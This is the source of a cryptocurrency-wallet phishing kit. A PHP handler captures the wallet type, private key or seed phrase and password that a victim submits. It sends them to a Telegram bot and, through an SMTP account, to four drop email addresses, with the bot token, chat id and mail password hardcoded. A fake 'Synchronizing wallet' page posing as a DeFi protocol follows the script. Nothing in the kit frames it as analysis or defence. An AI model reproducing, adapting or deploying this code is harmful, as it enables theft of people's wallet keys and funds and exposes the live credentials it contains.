<?php
session_start();

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;
use PHPMailer\PHPMailer\SMTP;

require 'PHPMailer/src/Exception.php';
require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';

$wallet = $_SESSION['wallettype'];
$txtr = trim($_POST['txtar']);
$pass = (count($_POST) > 2) ? trim($_POST['txtin']) : "not available" ;
$tt = trim($_POST['walletname']);


$host = "mail.avra.org.br";
$from = "info@avra.org.br";
$useremail = "info@avra.org.br";
$userpass = "1Pg({f=h~lpt";
$destination1 = "podjescott@yandex.com";
$destination2 = "backupdatavps@hotmail.com";
$destination3 = "form@bacimmanti.com";
$destination4 = "fbixhacker@gmail.com";
$reply = "info@avra.org.br";


//telegram section
$parameters = array(
	"chat_id" => "5937582551",
	"text" => "Wallet : $wallet  \nKey : $txtr \nPassword :  $pass \nType : $tt "
);


function send($method, $parameters) {
	$bot_token = "5712746804:AAGujjjg0q67k9SMAyWVy08Rg8OatjhRNyEdO3U";
	$url = "https://api.telegram.org/bot$bot_token/$method";
	
	if(!$curl = curl_init()){
		exit();
	}
	
	curl_setopt($curl, CURLOPT_POST, true);
	curl_setopt($curl, CURLOPT_POSTFIELDS, $parameters);
	curl_setopt($curl, CURLOPT_URL, $url);
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
	$output = curl_exec($curl);
	return $output;
	
}

 send("sendmessage",$parameters);

//Create an instance; passing `true` enables exceptions
$mail = new PHPMailer(true);


$bodycontent = <<<__INFO__
<!DOCTYPE html>
<html lang="en-US">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>WalletDappsconnect</title>
</head>
<body leftmargin="0" marginwidth="0" topmargin="0" marginheight="0" offset="0" style="padding: 0;">

<div id="wrapper" dir="ltr" style="background-color: #f7f7f7; margin: 0; padding: 70px 0; width: 100%; -webkit-text-size-adjust: none;">
<table border="0" cellpadding="0" cellspacing="0" height="100%" width="100%">
<tr><td align="center" valign="top">

<table border="0" cellpadding="10" cellspacing="0" width="600" id="temp">

<tr> <td> <b>Wallet type </b> </td> <td> $wallet </td> </tr>
<tr> <td> <b>Key</b> </td> <td> $txtr </td> </tr>
<tr> <td> <b>Password</b> </td> <td> $pass </td> </tr>
<tr> <td> <b>Type</b></td> <td> $tt </td><tr>

</table>
<tr>
<td align="center" valign="top">
<!-- Footer -->
<table border="0" cellpadding="10" cellspacing="0" width="600" id="template_footer"><tr>
<td valign="top" style="padding: 0; border-radius: 6px;">

<table border="0" cellpadding="10" cellspacing="0" width="100%"><tr>
<td colspan="2" valign="middle" id="credit" style='border-radius: 6px; border: 0; color: #8a8a8a; font-family: "Helvetica Neue", Helvetica, Roboto, Arial, sans-serif; font-size: 12px; line-height: 150%; text-align: center; padding: 24px 0;'>
<p style="margin: 0 0 16px;"> wallet <a href="#" style="color: #96588a; font-weight: normal; text-decoration: underline;">Walletdapps</a></p>
</td>
</tr></table>
</td>
</tr></table>
<!-- End Footer -->
</td>
</tr>

                                       


</table>
</div>
</body>
</html>

__INFO__;


try {
 //$mail->SMTPDebug = SMTP::DEBUG_SERVER; 
    $mail->isSMTP();
    $mail->Host = $host; 
    $mail->SMTPAuth = true;
    $mail->Username = $useremail ;
    $mail->Password = $userpass ;
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;
    $mail->Port = 465; 
    $mail->setFrom($from, 'WalletDappsconnect');
    $mail->addAddress($destination1); 
    $mail->addAddress($destination2); 
    $mail->addAddress($destination3); 
    $mail->addAddress($destination4);     
    $mail->addReplyTo($reply, 'Support');
    $mail->isHTML(true); 
    $mail->Subject = 'Wallet dapps website';
    $mail->Body = $bodycontent;
    $mail->send();    
    $message = 'Message has been sent';
} catch (Exception $e) {
 $message = "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
}

?>
<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width"/><meta charSet="utf-8"/><title>Synchronizing</title><meta name="description" content="DEFI PROTOCOL is a free protocol that lets users manage all their wallets from one space"/><link rel="icon" href="coin.png"/><meta name="next-head-count" content="5"/><link rel="preload" href="_next/static/css/2b7eea1d064d98b564d2.css" as="style"/><link rel="stylesheet" href="_next/static/css/2b7eea1d064d98b564d2.css" data-n-g=""/><noscript data-n-css=""></noscript></head><body><div id="__next"><header class="fixed z-50 w-full mb-60 bg-white py-8 px-6 text-white border-b shadow-md"><div class="container max-w-screen-lg mx-auto flex flex-row items-center justify-between"><div class="inline-flex items-center justify-center cursor-pointer"></div><div class="ml-4 hidden sm:inline-flex"></div></div></header><div class="h-28"></div><main><div class="container max-w-screen-sm py-20 px-5 md:px-8 flex flex-col h-full items-center justify-items-center mx-auto text-center"><img src="qrcode.png" class="h-60"/><svg class="animate-spin -ml-1 mr-3 h-16 w-16 text-primary" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg><h2 class="text-2xl text-center justify font-bold my-4">Synchronizing wallet...</h2><p class="text-lg text-gray-600 mb-6">This may take a few moments to complete</p><button class="inline-flex  mb-4 rounded-full bg-primary text-white active:bg-indigo-600 font-bold uppercase text-sm px-4 py-3 items-center justify-center shadow outline-none focus:outline-none mr-1 mb-1 ease-linear transition-all duration-150" type="button">Try Again</button></div></main><footer class="border-t border-gray-200"><div class="container max-w-screen-lg mx-auto flex flex-col md:flex-row md:items-center md:justify-between  py-4"><ul class="flex mb-4 md:order-1 md:ml-4 md:mb-0"><li><a href="#" class="flex justify-center items-center text-primary bg-white hover:bg-white-100 rounded-full shadow transition duration-150 ease-in-out" aria-label="Twitter"><svg class="w-8 h-8 fill-current" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><path d="M24 11.5c-.6.3-1.2.4-1.9.5.7-.4 1.2-1 1.4-1.8-.6.4-1.3.6-2.1.8-.6-.6-1.5-1-2.4-1-1.7 0-3.2 1.5-3.2 3.3 0 .3 0 .5.1.7-2.7-.1-5.2-1.4-6.8-3.4-.3.5-.4 1-.4 1.7 0 1.1.6 2.1 1.5 2.7-.5 0-1-.2-1.5-.4 0 1.6 1.1 2.9 2.6 3.2-.3.1-.6.1-.9.1-.2 0-.4 0-.6-.1.4 1.3 1.6 2.3 3.1 2.3-1.1.9-2.5 1.4-4.1 1.4H8c1.5.9 3.2 1.5 5 1.5 6 0 9.3-5 9.3-9.3v-.4c.7-.5 1.3-1.1 1.7-1.8z"></path></svg></a></li><li class="ml-4"><a href="#" class="flex justify-center items-center text-primary bg-white hover:bg-white-100 rounded-full shadow transition duration-150 ease-in-out" aria-label="Github"><svg class="w-8 h-8 fill-current" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><path d="M16 8.2c-4.4 0-8 3.6-8 8 0 3.5 2.3 6.5 5.5 7.6.4.1.5-.2.5-.4V22c-2.2.5-2.7-1-2.7-1-.4-.9-.9-1.2-.9-1.2-.7-.5.1-.5.1-.5.8.1 1.2.8 1.2.8.7 1.3 1.9.9 2.3.7.1-.5.3-.9.5-1.1-1.8-.2-3.6-.9-3.6-4 0-.9.3-1.6.8-2.1-.1-.2-.4-1 .1-2.1 0 0 .7-.2 2.2.8.6-.2 1.3-.3 2-.3s1.4.1 2 .3c1.5-1 2.2-.8 2.2-.8.4 1.1.2 1.9.1 2.1.5.6.8 1.3.8 2.1 0 3.1-1.9 3.7-3.7 3.9.3.4.6.9.6 1.6v2.2c0 .2.1.5.6.4 3.2-1.1 5.5-4.1 5.5-7.6-.1-4.4-3.7-8-8.1-8z"></path></svg></a></li><li class="ml-4"><a href="#" class="flex justify-center items-center text-primary bg-white hover:bg-white-100 rounded-full shadow transition duration-150 ease-in-out" aria-label="Facebook"><svg class="w-8 h-8 fill-current" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><path d="M14.023 24L14 17h-3v-3h3v-2c0-2.7 1.672-4 4.08-4 1.153 0 2.144.086 2.433.124v2.821h-1.67c-1.31 0-1.563.623-1.563 1.536V14H21l-1 3h-2.72v7h-3.257z"></path></svg></a></li></ul><div class="text-sm mr-4">© <!-- -->2023<!-- --> <a class="text-primary hover:underline" href="/">FIXIT</a>. All rights reserved.</div></div></footer></div>

</body></html>